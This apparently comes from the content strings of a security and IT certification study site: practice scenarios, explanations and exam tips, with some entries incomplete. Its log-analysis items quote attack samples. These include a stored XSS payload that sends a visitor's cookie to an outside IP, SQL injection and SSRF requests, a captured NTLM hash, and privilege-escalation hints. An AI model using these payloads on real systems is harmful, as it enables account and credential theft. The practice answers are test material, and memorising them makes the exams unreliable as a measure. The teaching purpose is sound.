pbqs.title: Configure the perimeter firewall
pbqs.scenario: Your station is putting a public information site in its DMZ. Configure the firewall so it meets each requirement. Rules run top to bottom, and the last rule is the cleanup rule.

rows.req: Anyone on the internet can reach the public site, over HTTPS only.
rows.why: Public users can come from anywhere, so the source is Any. Only 443: leaving 80 open would allow unencrypted HTTP.

rows.req: Admins on the LAN can manage the web server over SSH.
rows.why: Restrict SSH to the admin subnet, never Any. RDP (3389) is for Windows remote desktop, not SSH.

rows.req: If the web server is compromised, it must not be able to start connections into the LAN.
rows.why: This is the whole point of a DMZ: a hacked public server can't pivot inward. Deny any port from the web server to the LAN.

rows.req: LAN workstations can browse websites.
rows.why: Web browsing is HTTP and HTTPS. A real network also needs DNS to your resolver; it's left out to keep this focused.

rows.req: Block everything that isn't explicitly allowed.
rows.why: The cleanup (implicit deny) rule. It must be last: placed first, it would block everything.

pbqs.title: Identify the attack in each log
pbqs.scenario: The SOC flagged six events overnight. Read each log and pick the attack it shows. Each answer is used once; two options are distractors.

items.why: The ../ sequences climb out of the web folder to read /etc/passwd. The 200 response means it worked.
' OR '1'='1 makes the WHERE clause always true. The huge response size (48 KB) suggests the whole table came back.

items.log:
Nov 06 03:01:12 sshd[2211]: Failed password for jsmith from 203.0.113.50
Nov 06 03:01:13 sshd[2213]: Failed password for jsmith from 203.0.113.50
… 412 more failures for jsmith in 6 minutes …
Nov 06 03:07:40 sshd[2690]: Accepted password for jsmith from 203.0.113.50
items.why: Hundreds of rapid guesses against one account, then a success. One account plus many passwords is brute force.

items.log:
03:30:02  Logon failure  a.rivera   src 203.0.113.77
03:30:04  Logon failure  b.chen     src 203.0.113.77
03:30:05  Logon failure  c.okafor   src 203.0.113.77
… one failure each for 96 accounts …
04:00:03  Same pattern repeats
items.why: One attempt per account across many accounts, repeated on a slow cycle to dodge lockout. That's spraying.
The gateway's IP suddenly maps to a different MAC and keeps flipping. Someone is answering ARP for the gateway to sit in the middle of traffic.

items.log: POST /feedback  comment=<script>new Image().src='https://203.0.113.9/c?'+document.cookie</script>
items.why: A script stored in a comment runs in every visitor's browser and sends their session cookie to the attacker. That's stored XSS.

pbqs.title: Match each task to its protocol and port
pbqs.scenario: A small office is setting up its network. For each task, pick the protocol it uses and the port that protocol listens on by default.

rows.req: Manage a Linux server's command line over an encrypted session.
rows.why: SSH on 22. It replaced Telnet (23), which sends everything, passwords included, in clear text.

rows.req: Take over a Windows workstation's desktop remotely.
rows.why: Remote Desktop Protocol listens on 3389.

rows.req: Turn names like intranet.local into IP addresses.
rows.why: DNS on 53 (UDP for most lookups, TCP for large responses and zone transfers).

rows.req: Hand out IP addresses to devices automatically.
rows.why: DHCP: servers listen on 67, clients on 68. A device that can't reach DHCP falls back to a 169.254.x.x APIPA address.

rows.req: Open a shared folder on a Windows file server.
rows.why: Modern Windows file sharing runs SMB directly over 445.

rows.req: Read email while keeping it stored on the server.
rows.why: IMAP on 143 keeps mail on the server. POP3 (110) downloads it and usually deletes it from the server.

pbqs.title: Put the laser imaging process in order
pbqs.scenario: A user asks why pages come out of the laser printer warm. Walk them through the imaging process by giving each stage its step number.

items.text: Heat and pressure melt the toner into the paper.
items.why: Step 6. It's why pages come out warm, and a weak fuser makes toner smear or rub off.

items.text: The drum gets a uniform negative charge.
items.why: Step 2. The primary charge roller (or corona) preps the drum.

items.text: Leftover toner is wiped off the drum and its charge is removed.
items.why: Step 7. It readies the drum for the next page.

items.text: The printer turns the page data into an image in memory.
items.why: Step 1. The image is built in RAM before anything touches the drum.

items.text: The image moves from the drum onto the paper.
items.why: Step 5. The transfer roller charges the paper so the toner jumps to it.

items.text: A laser writes the image onto the drum by discharging spots.
items.why: Step 3. The laser neutralizes the areas where the image goes.

items.text: Toner sticks to the discharged areas of the drum.
items.why: Step 4. Toner is attracted to the areas the laser exposed.

pbqs.title: Put the malware removal steps in order
pbqs.scenario: A user's laptop shows constant pop-ups and a browser home page that keeps changing back. Put CompTIA's malware removal best practice in order.

items.text: Educate the end user.
items.why: Step 7. Show the user how it likely got in so it doesn't happen again.

items.text: Quarantine the infected system.
items.why: Step 2. Disconnect it from the network so the malware can't spread.

items.text: Enable System Restore and create a restore point.
items.why: Step 6. Only once the system is clean, so the new restore point is clean too.

items.text: Investigate and verify the malware symptoms.
items.why: Step 1. Confirm it's actually malware before acting.

items.text: Remediate: update anti-malware, then scan and remove.
items.why: Step 4. Update definitions first, then scan (safe mode or a boot environment if needed).

items.text: Disable System Restore in Windows.
items.why: Step 3. Old restore points may hold the malware; disabling deletes them.

items.text: Schedule scans and run updates.
items.why: Step 5. Keep the system protected going forward.

pbqs.title: Pick the right Windows tool for each ticket
pbqs.scenario: Six help desk tickets came in this morning. Pick the tool that solves each one. Each answer is used once; two options are distractors.

items.text: A new 2 TB drive shows up in the BIOS but not in File Explorer. Initialize and partition it.
items.why: Disk Management initializes, partitions and formats drives.

items.text: The PC is slow right now. Find the process using 95% CPU and end it.
items.why: Task Manager shows live per-process CPU use and lets you end tasks.

items.text: Windows warns that protected system files may be corrupted. Verify and repair them.
items.why: System File Checker (sfc /scannow) scans and repairs protected system files.

items.text: A laptop blue-screened overnight. Find the error logged right before the crash.
items.why: Event Viewer keeps the System and Application logs, including critical errors before a crash.

items.text: A webcam shows a yellow warning icon after an update. Roll back its driver.
items.why: Device Manager shows device status and has Roll Back Driver in the device's properties.

items.text: A new password policy was pushed, but this PC hasn't picked it up. Apply it now.
items.why: gpupdate /force reapplies all Group Policy settings immediately.

pbqs.title: Split the network into four subnets
pbqs.scenario: Your station was given 192.168.10.0/24. Split it into four equal subnets, one per department. Fill in each subnet's network ID, broadcast address and subnet mask.

rows.req: Subnet 1: Operations
rows.why: Four equal subnets means borrowing 2 bits: /26, mask 255.255.255.192, blocks of 64. The first block runs .0 to .63.

rows.req: Subnet 2: Engineering
rows.why: The next block of 64 starts at .64 and ends at .127, its broadcast.

rows.req: Subnet 3: Admin
rows.why: The third block is .128 to .191.

rows.req: Subnet 4: Guest Wi-Fi
rows.why: The last block is .192 to .255. Every subnet keeps the same /26 mask.

pbqs.title: Diagnose six network tickets
pbqs.scenario: The help desk escalated six tickets. Read the output in each one and pick the cause. Each answer is used once; two options are distractors.

items.log:
Switch Gi1/0/7:  full-duplex, 1000 Mb/s
Server NIC:      half-duplex, 100 Mb/s
late collisions: 1,904 and rising
items.why: One side is full duplex, the other half. Late collisions are the classic sign of a duplex mismatch.

items.log:
Gi1/0/12 is up, line protocol is up
input errors 5,233   CRC 5,190   (rising)
note: cable run passes the generator room
items.why: Rising CRC errors on a link that's up point to a damaged cable or electrical interference along the run.

items.log:
IPv4 Address . . : 10.30.4.18
Subnet Mask . . : 255.255.255.0
User should be on Staff (10.10.4.0/24); can't reach the file share
items.why: The PC got an address from the guest range, so its switch port is in the wrong VLAN.

items.log:
IPv4 Address . . : 10.10.20.55
Subnet Mask . . : 255.255.255.0
Default Gateway : 10.10.21.1
Local printers work; nothing off the subnet does
items.why: 10.10.21.1 isn't inside 10.10.20.0/24, so traffic leaving the subnet has nowhere to go.

items.log:
Gi1/0/22: inline power denied, insufficient power budget
New camera on Gi1/0/22 never powers on
items.why: The switch has run out of PoE budget, so the new camera gets no power.

items.log:
> nslookup intranet
Server: 10.10.20.9
*** Request to 10.10.20.9 timed out
> ping 10.10.20.40   (intranet's IP)
Reply from 10.10.20.40: time<1ms
items.why: The host itself is reachable by IP; only name lookups fail, so DNS is misconfigured or unreachable.

pbqs.title: Who's responsible?
pbqs.scenario: Your unit runs workloads on all three service models. For each task, pick who is responsible in IaaS, PaaS and SaaS: the customer (your unit) or the cloud provider.

rows.req: Physical security of the data center
rows.why: Always the provider. Customers never touch the physical facility.

rows.req: Patching the hypervisor and host hardware
rows.why: The provider owns the virtualization layer in every model.

rows.req: Patching the guest operating system
rows.why: In IaaS you run the OS. In PaaS and SaaS the provider manages it for you.

rows.req: Maintaining the application code
rows.why: In IaaS and PaaS it's your code. In SaaS the provider builds and runs the app.

rows.req: Managing user accounts and permissions
rows.why: Always the customer. Even in SaaS, you decide who gets access.

rows.req: Classifying and protecting your data
rows.why: Always the customer. You own your data in every model.

pbqs.title: Diagnose six cloud tickets
pbqs.scenario: Six cloud tickets came in overnight. Read each error and pick the cause. Each answer is used once; two options are distractors.

items.log:
Error: InstanceLimitExceeded
You have requested more vCPU capacity than your current vCPU limit of 32 allows.
items.why: The account hit its vCPU quota. Request a limit increase or right-size the deployment.

items.log:
$ curl -m 5 https://10.0.2.15
curl: (28) Connection timed out
Instance status: running, 2/2 checks passed
Inbound rules: 22/tcp from 10.0.0.0/16
items.why: The instance is healthy, but the security group only allows SSH. HTTPS (443) is never let in.

items.log:
AccessDenied: role/deploy-bot is not authorized to perform
s3:PutObject on resource backups/*
items.why: The role exists but has no permission to write objects to the backup bucket.

items.log:
apt update: could not connect to archive.ubuntu.com
Route table: 10.0.0.0/16 -> local
(no 0.0.0.0/0 route)
items.why: With no default route to a NAT gateway, private instances can't reach the internet for updates.

items.log:
$ dig +short app.unit.example
203.0.113.40
Note: load balancer moved to 198.51.100.7 yesterday
items.why: DNS still points at the old address, so users hit the retired load balancer.

items.log:
Token rejected: issued-at time is in the future
Server clock: 09:42:10
Actual time:  09:47:55
items.why: The server's clock is about six minutes behind, so valid tokens look like they come from the future. Fix NTP.

pbqs.title: Fix the vulnerability scan findings
pbqs.scenario: Your weekly scan flagged six findings. Read each one and pick the BEST remediation. Each answer is used once; two options are distractors.
choices: Set Secure and HttpOnly on the cookie
Verify, then mark as a false positive

items.log:
Plugin 104743  TLS Version 1.0 Protocol Detection  Medium
The remote service accepts connections encrypted using TLS 1.0 and TLS 1.1.
items.why: Old TLS versions have known weaknesses. Turn them off and allow only TLS 1.2 and 1.3.

items.log:
Plugin 96982  Server Message Block (SMB) Protocol Version 1 Enabled  Medium
SMBv1 is deprecated; EternalBlue-class exploits target it.
items.why: SMBv1 is obsolete and was the path for WannaCry. Disable it; modern Windows uses SMBv2/3.

items.log: Plugin 11219  Web interface accepts default credentials (admin / admin)  High
items.why: Default credentials are public knowledge. Change them (and restrict the admin page).

items.log:
Plugin 153584  Apache 2.4.49 < 2.4.51 Path Traversal (CVE-2021-41773)  Critical
Listed in CISA Known Exploited Vulnerabilities.
items.why: A known, actively exploited bug in the software version itself. The only real fix is upgrading Apache.

items.log:
Plugin 112529  Session cookie without Secure/HttpOnly flags  Low
Set-Cookie: SESSIONID=8f3a...; Path=/
items.why: Secure keeps the cookie on HTTPS only; HttpOnly keeps scripts from stealing it.

items.log:
Plugin 10671  Microsoft IIS 6.0 WebDAV Remote Code Execution  Critical
Host OS: Ubuntu 24.04 · Server header: nginx/1.24.0
items.why: An IIS finding on a Linux host running nginx doesn't fit. Confirm it, then document it as a false positive instead of patching nothing.

pbqs.title: Triage the SIEM queue
pbqs.scenario: You're on shift and four alerts are in the queue. Decide whether each one is malicious or benign, and pick the right next step. Each next step is used once.

rows.req: Impossible travel: j.ortiz signs in from Virginia, then from overseas 9 minutes later. An MFA push was approved, and a new inbox rule forwards all mail to an outside address.
rows.why: An approved MFA push plus a forwarding rule means the account is taken over. Disable it and revoke active sessions so stolen tokens stop working.

rows.req: EDR: WINWORD.EXE spawned powershell.exe -enc JABzAD0A…, which then connected to a domain registered yesterday.
rows.why: Office launching encoded PowerShell that calls a brand-new domain is a classic malicious macro. Isolate the host before it spreads.

rows.req: Port scan detected from 10.10.5.20, the vulnerability scanner, during the approved Tuesday scan window.
rows.why: A real scan, but authorized. Close it and tune the rule to exclude the scanner during its window so it stops wasting analyst time.

rows.req: Antivirus caught the EICAR test file on a help desk laptop. Ticket #8812 says IT is testing AV coverage today.
rows.why: EICAR is a harmless test file and the activity is approved. Close it and note the ticket so the record shows why.

extras.title: Reading a CVSS vector
extras.sub: 2.0 · CVSS 3.1 base metrics, still the most common in scan reports
rows: N network · A adjacent · L local · P physical. Network is the easiest to reach.
L low · H high. Low means the attack works reliably.
N none · L low · H high. None means no login is needed.
N none · R required. None means no one has to click anything.
U unchanged · C changed. Changed means it can break out to other components.
H high · L low · N none, for confidentiality, integrity and availability.

pbqs.title: Make the scope calls
pbqs.scenario: You're mid-engagement. Your signed SoW covers 10.20.0.0/16 and app.acme.example, Monday to Friday, 08:00–18:00. For each situation, decide whether it's in scope and pick the right next step. Each next step is used once.

rows.req: It's 10:00 on Tuesday. A scan shows 10.20.4.15 is a domain controller, and the rules of engagement allow password attacks against Active Directory.
rows.why: The host is in the signed range, the time is inside the window and the technique is allowed. Go ahead and log everything you do.

rows.req: The app's code references a storage bucket named acme-backups-prod. It lives in a cloud account that isn't listed in the SoW.
rows.why: Owning the data isn't the same as authorizing the test. An unlisted cloud account is out of scope until the client approves it in writing.

rows.req: On an in-scope file server you find another company's customer records and a web shell you didn't upload. Someone else may already be in the network.
rows.why: The server is in scope, but signs of a real breach are a critical finding. Stop and escalate right away using the agreed path.

rows.req: app.acme.example loads JavaScript from cdn.vendor.example, a third party. You want to test the CDN for injection flaws.
rows.why: The CDN belongs to another company, so you can't attack it. You can still report the risk of loading third-party scripts without integrity checks.

pbqs.title: Name the finding from the tool output
pbqs.scenario: Each snippet comes from an authorized test. Read it and pick the attack or weakness it shows. Each answer is used once; two choices are distractors.
choices: SSRF to the cloud metadata service

items.log:
10.20.4.31  445/tcp open  microsoft-ds
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
items.why: Without required signing, captured authentication can be relayed to this host. Fix: require SMB signing on every server and workstation.

items.log:
[SMB] NTLMv2-SSP Client   : 10.20.7.44
[SMB] NTLMv2-SSP Username : ACME\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::ACME:1122334455667788:9F1C...
items.why: A captured NetNTLMv2 response can't be passed, but it can be cracked offline with hashcat mode 5600. Weak passwords fall fast.

items.log:
GET /item?id=7' HTTP/1.1

HTTP/1.1 500 Internal Server Error
You have an error in your SQL syntax near ''' at line 1
items.why: A single quote broke the database query and the error came back. That's a strong sign of SQL injection. Confirm carefully, then report it.

items.log:
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role

{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
items.why: The server fetched the metadata service for you and returned the role's temporary keys. Fix: validate URLs, block internal addresses and require IMDSv2.

items.log:
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
items.why: find shouldn't have the SUID bit. Because it can run commands, it runs them as root. GTFOBins lists the exact abuse.

items.log:
AcmeAgent   C:\Program Files\Acme Agent\agent.exe   Auto

icacls "C:\Program Files\Acme"
  BUILTIN\Users:(W)
items.why: The path has spaces and no quotes, and normal users can write to C:\Program Files\Acme. Dropping Acme.exe there would run as SYSTEM. Fix: quote the path and lock down the folder.

domains.name: Security Operations
obj: Given a scenario, analyze data to enable monitoring and response activities
SIEM tuning, correlation, baselines, alert priority and dashboards.
Given a scenario, analyze vulnerabilities and attacks, and recommend solutions to reduce the attack surface
Injection, XSS, SSRF and weak configs, fixed with validation, patching, least privilege and allow lists.
Given a scenario, apply threat-hunting and threat intelligence concepts
Honeypots, ISACs, threat intel platforms, STIX and TAXII, Sigma, YARA and Snort.
Given a scenario, analyze data and artifacts in support of incident response activities
Malware analysis, reverse engineering, memory and network forensics, timelines and root cause.

pbqs.title: Match the crypto to the requirement
pbqs.scenario: Each team brought you a requirement. Pick the technique that meets it BEST. Each answer is used once; two choices are distractors.

items.log:
Analytics systems must never hold real card numbers,
but must still join records for the same card.
items.why: A token stands in for the card number everywhere, and the real number stays in a protected vault. That also shrinks PCI DSS scope.

items.log:
A provider must total encrypted salary data
without ever decrypting it.
items.why: Homomorphic encryption lets you compute on ciphertext. The provider never sees the real numbers.

items.log:
Field laptops may only run scripts and updates
that IT approved and that weren't changed in transit.
items.why: Code signing proves who published the code and that it hasn't been altered. Set the endpoints to run only signed code.

items.log:
If the server's private key is stolen next year,
traffic recorded today must stay unreadable.
items.why: With ECDHE each session gets its own throwaway key, so a stolen long-term key can't decrypt recorded sessions.

items.log:
Retire 400 self-encrypting drives in minutes,
with the data unrecoverable and no shredding.
items.why: Destroying the drive's media key makes all its data unreadable instantly. That's cryptographic erase.

items.log:
If the user database leaks, stored passwords
must be slow and costly to brute-force.
items.why: Key stretching (Argon2, bcrypt, PBKDF2) runs the hash thousands of times with a salt, so every guess costs the attacker real time.

pbqs.title: Make the zero trust decisions
pbqs.scenario: You're tuning the policy engine. For each access request, choose the decision and the signal that drives it most. Each signal is used once.

rows.req: An engineer opens the code repository at 10:00 from home on a company laptop. EDR reports the laptop is missing three months of patches.
rows.why: Identity looks fine, but the device fails its health check. Deny (or quarantine to a fix-up network) until it's patched.

rows.req: A sysadmin on a compliant laptop, during her normal hours, opens the server console that her role grants.
rows.why: Every signal checks out and the access matches her role. Allow, with least privilege still limiting what she can do.

rows.req: A manager on a compliant laptop signs in from a new country at 03:00 local time and asks for the HR share he uses daily.
rows.why: The request itself is normal, but the place and time are not. Step-up MFA confirms it's really him without blocking travel.

rows.req: A developer's account, which normally reads about 20 files a day, has downloaded 9,000 files from the design share in the last hour.
rows.why: That volume looks like data theft or a compromised account. Deny, alert the SOC and investigate.

extras.title: Zero trust building blocks
rows: The policy engine that decides allow or deny for every request, using identity, device and context.
The gateway or proxy that carries out the decision in front of the resource.
Trust is checked again during the session, not just at login.
Small zones around each workload, so one breach can't spread.
Networking and security (SWG, CASB, ZTNA) delivered from the cloud, close to users.

extras.title: Crypto to know
rows: New algorithms (NIST's ML-KEM and ML-DSA) built to resist quantum computers. Plan the move now for long-lived secrets.
A fresh key for every session (ECDHE), so a stolen server key can't decrypt old traffic.
Compute on encrypted data without ever decrypting it.
Swap sensitive data (like a card number) for a meaningless stand-in. The real value lives in a vault.
Slow, salted hashing (Argon2, bcrypt, PBKDF2) that makes password cracking expensive.
A TPM protects one device's keys and boot integrity. An HSM guards many keys for servers and CAs.
Destroy the key and the encrypted data is gone. Fast drive retirement.

extras.title: Email and DNS security
rows: A DNS record listing the servers allowed to send mail for your domain.
Signs each message so receivers can check it wasn't changed.
Tells receivers what to do when SPF or DKIM fail (none, quarantine, reject) and sends you reports.
Signs DNS answers so they can't be forged or poisoned.

extras.title: Frameworks and standards
rows: Govern, Identify, Protect, Detect, Respond, Recover. The common language for a security program.
An international, certifiable standard for running security.
Required for anyone who stores, processes or sends card data.
An audit report that shows customers a provider's controls work.
Ties IT goals and controls to business goals.

keep.text: Renew with 75 continuing education units (CEUs), or by passing the latest SecurityX exam or another qualifying cert.
SecurityX is the new name for CASP+ (CompTIA Advanced Security Practitioner). Older documents, job posts and DoD lists may still say CASP+.

items: Exam details and the V5 objectives summary.
The full numbered objectives (a copy hosted by a CompTIA training partner).
CompTIA's own course, labs and practice. The difficulty reference for this site's questions.
The reference for policy engines, enforcement points and zero trust designs.
How federal agencies move step by step toward zero trust.
Hands-on guides for identity, devices, apps and networks.
The framework most security programs are built on.
The new quantum-resistant standards and why they matter.
Attacker tactics and techniques, for threat modeling and detection.
Plain explanations of SPF, DKIM and DMARC.

tips: Flag the PBQs
They often come first and take time. Flag them, finish the multiple choice, then come back.
Pace the clock
165 minutes for up to 90 questions is just under 2 minutes each. Long scenarios eat time.
BEST, not just right
Several answers will work. Pick the one that solves the stated requirement with the least added risk or cost.
It's pass/fail
There's no score to chase. Spend your study time on your weakest domain.
Never leave a blank
There is no penalty for a wrong answer, so always pick something.

v26.label: 2026 outline
v26.note: ISC2 updated the CC outline on September 1, 2026, with new domain names and more on governance, cloud and threat intelligence. Older books and videos may still follow the previous outline, so make sure their domain names match these.

domains.name: Security Principles
obj: Understand cybersecurity concepts
Confidentiality, integrity, availability, authentication, authorization and accounting (AAA), non-repudiation and privacy.
Understand risk management concepts
The risk management life cycle: identify, assess, treat (avoid, transfer, mitigate, accept) and monitor.
Understand governance concepts
Laws and regulations, frameworks and guidelines, and how policies, standards and procedures fit together.
Understand cybersecurity controls
Technical, administrative and physical controls, and when to use each.
Maintain professional and ethical conduct
Due care and due diligence, codes of conduct and the ISC2 Code of Ethics.

domains.name: Security Governance
obj: Plan governance, risk, and compliance (GRC)
Why GRC matters, and the frameworks and tools organizations use for it.
Understand redundancy
Business continuity (BC) keeps the mission running; disaster recovery (DR) restores the IT.
Understand security awareness
A security culture led from the top, plus training on social engineering, phishing and passwords.
Measure cybersecurity effectiveness
Key metrics and key risk indicators (KRIs), shown on dashboards, scorecards and reports.

domains.name: Identity and Access Management (IAM) Concepts
obj: Understand identity life cycle management
Define roles, then provision, review and deprovision access as people join, move and leave.
Understand logical access controls
Least privilege, separation of duties and access control models (DAC, MAC, RBAC).

domains.name: Networking and Cloud Security Concepts
obj: Understand network security
OSI and TCP/IP models, IPv4 and IPv6, VPNs, firewalls and ports, Wi-Fi, Bluetooth, IoT and ICS.
Understand network security architecture
Segmentation (firewall zones, VLANs, microsegmentation), defense in depth and zero trust.
Understand cloud security
Cloud characteristics, service models (IaaS, PaaS, SaaS), deployment models and the shared responsibility model.

domains.name: Security Operations and Incident Response
obj: Understand data security
Classifying, labeling, masking and sanitizing data, plus symmetric, asymmetric and quantum-resistant encryption and hashing.
Understand security operations
Logging and monitoring, triage and correlation, threat actors and their motives, and threat intelligence.
Understand incident response (IR)
Putting the incident response plan into action, and testing it with exercises such as tabletops.
Understand asset protection
Asset life cycle (including end-of-life gear and software), configuration and change management.
Understand security testing
Red, blue and purple teams, vulnerability scanning, code analysis, threat modeling and physical tests.

pbqs.title: Sort the controls
pbqs.scenario: Your unit's security plan lists these controls. Decide whether each one is technical, administrative or physical. Each type is used twice.

items.log:
Firewall rule blocks inbound Telnet (port 23)
from outside the base network.
items.why: Enforced by technology, so it's a technical (logical) control.

items.log:
Everyone completes security awareness training
before getting a network account.
items.why: Training and policy are administrative (managerial) controls.

items.log:
Badge reader and logbook on the
server room door.
items.why: It controls physical entry, so it's a physical control.

items.log:
Acceptable use policy that every user
signs once a year.
items.why: A written rule people agree to is an administrative control.

items.log:
Multifactor authentication required
for all remote access.
items.why: MFA is enforced by systems, so it's technical.

items.log:
Concrete bollards in front of the
building entrance.
items.why: Bollards stop vehicles physically: a physical control.

pbqs.title: Triage these events
pbqs.scenario: You're on watch in the SOC. For each event, pick the severity and the FIRST action. Each first action is used once.

rows.req: A user mistyped their password once, then logged in normally.
rows.why: Normal behavior. Log it; no action needed unless a pattern appears.

rows.req: A user clicked a phishing link and typed their password into the fake page. No other activity yet.
rows.why: The password is compromised but not yet used. Reset it now (and check for new sign-ins) before an attacker gets in.

rows.req: EDR shows a workstation encrypting files on a shared drive right now.
rows.why: Active ransomware. Isolate the host immediately to stop the damage, then bring in the IR team.

rows.req: An admin account signed in at 03:00 from another country and created three new accounts.
rows.why: A likely compromised admin account with persistence. This needs the incident response team's full process right away.

extras.title: The core ideas
rows: Only the right people can see the data. Encryption and access control.
The data hasn't been changed without permission. Hashing and signatures.
Systems and data are there when needed. Backups and redundancy.
Who you are, what you may do, and a record of what you did.
You can't deny an action you took. Digital signatures and logs.

extras.title: Ports to know
rows: Remote admin, not encrypted: replace with SSH

extras.title: Cloud: who secures what
rows: You get virtual machines. You patch the OS, apps and data.
The provider runs the OS. You secure your code and data.
The provider runs the app. You manage users, settings and data.
Who has access, and the data itself, are always on you.

extras.title: Incident response, in order
rows: Prepare: a written plan, trained people, tools and contacts.
Detect and analyze: confirm it's really an incident and how bad it is.
Contain: stop the spread, for example by isolating a host.
Eradicate: remove the malware or close the hole.
Recover: restore systems and watch them closely.
Lessons learned: fix the plan so it goes better next time.

keep.text: Earn 45 continuing professional education (CPE) credits every three years. ISC2 suggests about 15 a year.
CC holders pay a $50 annual maintenance fee on their certification anniversary.
keep.after: It goes up to $135 a year if you add another ISC2 cert like SSCP or CISSP.

keep.text: Every ISC2 member agrees to the Code of Ethics. Breaking it can cost you the cert.
list: Protect society and the infrastructure
Act honorably, honestly, justly, responsibly and legally
Provide diligent and competent service to principals
Advance and protect the profession

items: The full 2026 outline, domain by domain.
Exam purchase options, exam windows and attempts.
Read the four canons. Ethics questions follow them.
ISC2's own course (90-day access), sold with the exam as a bundle.
Networking, web and Linux basics in guided browser labs.
Govern, Identify, Protect, Detect, Respond, Recover. Matches the governance domain.
How organizations plan for and handle incidents.

tips: No going back
CC uses computerized adaptive testing (CAT). You answer one question at a time and can't return to earlier ones, so take each one seriously.
It can end early
The exam stops once it's confident you've passed or failed, anywhere from 100 to 125 questions. Ending early isn't a bad sign.
Think like a manager
When answers look close, pick the one that protects people and follows policy, not the quick technical fix.
Ethics come first
For ethics questions, protecting society and acting honestly beat doing what a boss or client asks.
Never leave a blank
Every question needs an answer before you can move on, so make your best pick and keep going.

v25.label: 2025 outline
v25.note: Since October 1, 2025 the SSCP is an adaptive (CAT) exam: 100 to 125 questions in 2 hours. Older books may describe the earlier fixed-length exam, and may call Domain 1 by its old name, Security Operations and Administration. The weights didn't change.

domains.name: Security Concepts and Practices
obj: Comply with codes of ethics
The ISC2 Code of Ethics (four canons) and your organization's own code, and what to do when they pull in different directions.
Understand security concepts
Confidentiality, integrity and availability, plus accountability, non-repudiation, least privilege and privacy.
Identify and implement security controls
Technical, physical and administrative controls, and how compliance checks and audits confirm they actually work.
Document and maintain functional security controls
Control types (deterrent, preventive, detective, corrective, compensating), security principles and separation of duties.
Support the asset management lifecycle
Track hardware, software and data from purchase to secure disposal. You can't protect what you don't know you have.
Support and implement change management
Change requests, a security impact analysis before each change, and configuration management so systems match their approved baseline.
Support security awareness and training
Phishing drills and role-based training, and measuring whether behavior actually changes.
Collaborate with physical security operations
Badges, cameras, locks and server room controls, and how they back up the logical controls.

domains.name: Access Controls
obj: Implement and maintain authentication methods
Single-factor and multifactor (MFA), single sign-on (SSO), device authentication and federation, where one organization trusts another's logins.
Understand internetwork trust architectures
Trust relationships (one-way, two-way, transitive), security zones and third-party connections like extranets.
Support the identity management lifecycle
Identity proofing, provisioning and deprovisioning, entitlements, access reviews and the IAM systems that automate them.
Understand and administer access controls
Mandatory (MAC), discretionary (DAC), role-based (RBAC), rule-based and attribute-based (ABAC) models, and where each one fits.

domains.name: Risk Identification, Monitoring and Analysis
obj: Understand risk management
Risk registers and reporting, frameworks like the NIST RMF, risk tolerance, and the four treatments: avoid, transfer, mitigate, accept.
Understand legal and regulatory concerns
Which laws apply where (jurisdiction), their limits, and privacy rules for personal data.
Perform security assessments and vulnerability management
Assess against a framework, run scans and tests, review the risk, and work the vulnerability lifecycle: find, rank, fix, verify.
Operate and monitor security platforms
Choose log sources and events of interest, manage logs, and run a SIEM that pulls them together and correlates them.
Analyze monitoring results
Compare activity against baselines, spot anomalies and trends with metrics and visuals, and document and report what you found.

domains.name: Incident Response and Recovery
obj: Support the incident response lifecycle
Preparation, detection and analysis (and escalation), containment, eradication, recovery and post-incident lessons learned.
Support forensic investigations
Legal and ethical rules, evidence handling and chain of custody, and reporting your analysis.
Support business continuity and disaster recovery
Emergency response plans, alternate processing sites, restoration order, backups and redundancy, and testing with drills.

domains.name: Cryptography
obj: Understand reasons and requirements for cryptography
Confidentiality, integrity and authenticity, how data sensitivity and regulations drive encryption, and why good randomness (entropy) matters.
Apply cryptography concepts
Hashing and salting, symmetric and asymmetric encryption, non-repudiation, key length and strength, and basic cryptanalysis (attacks on crypto).
Understand and implement secure protocols
Pick the secure version: TLS, HTTPS, SSH, SFTP and IPsec. Retire the clear-text ones.
Understand and support PKI
Certificates and certificate authorities, key management (create, store, rotate, revoke), the web of trust, and where PKI falls short.

domains.name: Network and Communications Security
obj: Understand and apply networking concepts
OSI and TCP/IP models, topologies, transmission media, software-defined networking (SDN), and common ports and protocols.
Understand network attacks and countermeasures
DDoS, man-in-the-middle and DNS cache poisoning, and the defenses: CDNs, firewalls, network access control and IDS/IPS.
Manage network access controls
802.1X port-based access, RADIUS and TACACS+, and remote access through VPNs, thin clients and virtual desktops (VDI).
Manage network security
Where to place devices, how to segment the network, and how to manage network gear securely.
Operate network security appliances and services
Firewalls and proxies, IDS/IPS, routers and switches, traffic shaping, NAC, data loss prevention (DLP) and unified threat management (UTM).
Secure wireless communications
Cellular, Wi-Fi, Bluetooth and NFC risks; WPA2 and WPA3, and EAP for enterprise Wi-Fi.
Secure and monitor IoT devices
Harden their settings, isolate them on their own network, keep firmware updated and plan for end-of-life devices.

domains.name: Systems and Application Security
obj: Identify and analyze malicious code and activity
Malware types and countermeasures, social engineering, insider activity, and behavior analytics that flag the unusual.
Implement and operate endpoint security
Host IDS/IPS, host firewalls, application allow lists, full-disk encryption, the TPM chip, secure browsing, and endpoint detection and response (EDR) that can alert, investigate and isolate a host.
Administer and manage mobile devices
Provisioning models like BYOD and COPE, mobile device management (MDM), containerization that keeps work data apart, encryption, and mobile application management.
Understand and configure cloud security
Public, private, hybrid and community clouds; IaaS, PaaS and SaaS; the shared responsibility model; third-party and legal requirements.
Operate and maintain secure virtual environments
Type 1 and Type 2 hypervisors, virtual appliances, containers, continuity and resilience, storage, and attacks like VM escape.

pbqs.title: Pick the access control model
pbqs.scenario: Your unit is reviewing how access is granted on six systems. Pick the access control model each one is using.

items.log:
Users can open a document only if their
clearance is at or above its label.
items.why: The system enforces labels and clearances, and users can't change them. That's mandatory access control.

items.log:
Petty officer creates a folder and adds
two shipmates to it herself.
items.why: The owner decides who gets in, so it's discretionary access control.

items.log:
Anyone in the 'Help Desk' group can reset
passwords. Leave the group, lose the right.
items.why: Rights come from the job role, so it's role-based access control.

items.log:
Block all inbound traffic to the training
lab between 2200 and 0600.
items.why: One system-wide rule applies to everyone, so it's rule-based access control.

items.log:
Allow if user is in the unit AND device is
gov-issued AND location is in the U.S.
items.why: The decision combines user, device and location attributes. That's attribute-based access control.

items.log:
Supervisors see the records for their
division; clerks see only their own.
